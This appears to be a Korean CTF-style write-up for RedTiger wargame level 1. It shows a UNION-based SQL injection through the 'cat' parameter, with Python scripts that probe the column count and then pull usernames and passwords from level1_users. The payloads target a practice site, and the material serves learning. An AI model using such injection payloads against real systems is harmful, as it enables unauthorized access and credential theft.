================================================================================================================
[redtiger] level1
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="cat=1 union select %s from level1_users",arrowhead="normal"];
        step3 -> step2[label="Column Length",arrowhead="normal"];
        step4 -> step5[label="cat=1 union select 1,2,username,password from level1_users",arrowhead="normal"];
        step7 -> step6[label="Data Extract",arrowhead="normal"];
    }

|

server -> DB 예측
================================================================================================================

- 테이블명: level1_users
- GET 파라미터: cat

.. code-block:: sql

    SELECT * FROM tb_name where
    cat=$_GET["cat"]

|

union select
================================================================================================================

- 컬럼 개수 확인

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level1.php"

    n = 0
    ret = ''
    for l in range(20):
        params = {
            "cat": "1 union select %s from level1_users" % str(n)
        }
        print params.values()[0]
        n = str(n) + "," + str(l+1)
        r = requests.get(url, params=params, verify=False)
        print r.content

|

union select
================================================================================================================

- 데이터 추출

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level1.php"

    params = {
        "cat": "1 union select 1,2,username,password from level1_users"
    }
    r = requests.get(url, params=params, verify=False)
    print r.content

|